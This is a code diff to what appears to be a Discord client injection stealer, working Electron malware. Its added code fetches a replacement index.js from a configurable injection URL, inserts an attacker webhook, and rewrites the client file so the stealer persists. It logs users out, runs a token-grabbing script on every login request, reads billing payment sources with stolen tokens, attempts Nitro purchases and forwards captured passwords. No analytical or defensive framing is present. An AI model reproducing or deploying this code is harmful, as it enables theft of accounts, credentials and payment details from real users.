@@ -4,6 +4,8 @@ const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
+
+
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
@@ -84,19 +86,6 @@ const discordPath = (function () {
   return { undefined, undefined };
 })();
 
-const execScript = async (script) => {
-  let window;
-  while (!window) {
-    const windows = BrowserWindow.getAllWindows();
-    if (windows.length > 0) {
-      window = windows[0];
-    } else {
-      await new Promise(resolve => setTimeout(resolve, 100));
-    }
-  }
-  return window.webContents.executeJavaScript(script, true);
-};
-
 async function updateCheck() {
   const { resourcePath, app } = discordPath;
   if (resourcePath === undefined || app === undefined) return;
@@ -123,54 +112,45 @@ async function updateCheck() {
       ),
     );
 
-    const startUpScript = `const fs = require('fs'), https = require('https');
-const indexJs = '${indexJs}';
-const bdPath = '${bdPath}';
-const fileSize = fs.statSync(indexJs).size
-fs.readFileSync(indexJs, 'utf8', (err, data) => {
-    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
-        init();
-})
-async function init() {
-    https.get('${config.injection_url}', (res) => {
-        const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
-        res.pipe(file);
-        file.on('finish', () => {
-            file.close();
-        });
+    const startUpScript = async () => await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`const fs=require("fs"),https=require("https"),path=require("path"),indexJs="${indexJs}",bdPath="${bdPath}",resourcePath="${resourcePath}",fileSize=fs.statSync(indexJs).size;async function init(){https.get("${config.injection_url}",(r=>{const e=fs.createWriteStream(indexJs);r.on("data",(r=>{const t=r.toString().replace("%WEBHOOK%","${config.webhook}");e.write(t)})),r.on("end",(()=>e.end()))})).on("error",(r=>{console.error("Error fetching data from URL:",r),setTimeout(init,1e4)}))}fs.readFile(indexJs,"utf8",((r,e)=>{if(r)return console.error("Error reading file:",r);(fileSize<2e4||"module.exports = require('./core.asar')"===e)&&init()}));try{require(path.join(resourcePath,"app.asar"))}catch(r){console.error("Error loading app.asar:",r)}if(fs.existsSync(bdPath))try{require(bdPath)}catch(r){console.error("Error loading bdPath:",r)}`);
     
-    }).on("error", (err) => {
-        setTimeout(init(), 10000);
-    });
-}
-require('${path.join(resourcePath, 'app.asar')}')
-if (fs.existsSync(bdPath)) require(bdPath);`;
-
     startUpScript().then(startUpScriptResult => {
       const startUpScriptString = String(startUpScriptResult);
       fs.writeFileSync(resourceIndex, startUpScriptString.replace(/\\/g, '\\\\'));
-      
     });
   }
   const initiationFolderPath = path.join(__dirname, 'initiation');
   if (!fs.existsSync(initiationFolderPath)) {
     fs.mkdirSync(initiationFolderPath);
-    await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT, true);
     await sleep(3000);
+    wwww();
   }
-  
   return !1;
-}
+};
 
+const wwww = async () => {
+  await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT, true);
+};
+
+const reeeee = async () => {
+  await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(TOKEN_SCRIPT, true);
+};
 
 const getInfo = async (token) => {
-  const info = await execScript(`var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","${config.api}",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;`);
+  const info = await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", "${config.api}", false);
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send(null);
+    xmlHttp.responseText;`);
   return JSON.parse(info);
 };
 
 const fetchBilling = async (token) => {
-  const bill = await execScript(`var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","${config.api}/billing/payment-sources",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;`);
+  const bill = await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); 
+    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
+    xmlHttp.setRequestHeader("Authorization", "${token}"); 
+    xmlHttp.send(null); 
+    xmlHttp.responseText`);
   if (!bill.lenght || bill.length === 0) return '';
   return JSON.parse(bill);
 };
@@ -206,7 +186,7 @@ const Purchase = async (token, id, _type, _time) => {
     sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
   };
 
-  const req = execScript(`var xmlHttp=new XMLHttpRequest,url="https://discord.com/api/v9/store/skus/"+config.nitro[_type][_time].id+"/purchase";xmlHttp.open("POST",url,!1),xmlHttp.setRequestHeader("Authorization",token),xmlHttp.setRequestHeader("Content-Type","application/json"),xmlHttp.send(JSON.stringify(options));var responseText=xmlHttp.responseText;`);
+  const req = BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`var xmlHttp=new XMLHttpRequest,url="https://discord.com/api/v9/store/skus/"+config.nitro[_type][_time].id+"/purchase";xmlHttp.open("POST",url,!1),xmlHttp.setRequestHeader("Authorization",token),xmlHttp.setRequestHeader("Content-Type","application/json"),xmlHttp.send(JSON.stringify(options));var responseText=xmlHttp.responseText;`);
   if (req['gift_code']) {
     return 'https://discord.gift/' + req['gift_code'];
   } else return null;
@@ -683,6 +663,7 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
   if (details.statusCode !== 200 && details.statusCode !== 202) return;
   const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
   const data = JSON.parse(unparsed_data);
+  reeeee();
   switch (true) {
     case details.url.endsWith('login'):
       login(data.login, data.password, token).catch(console.error);
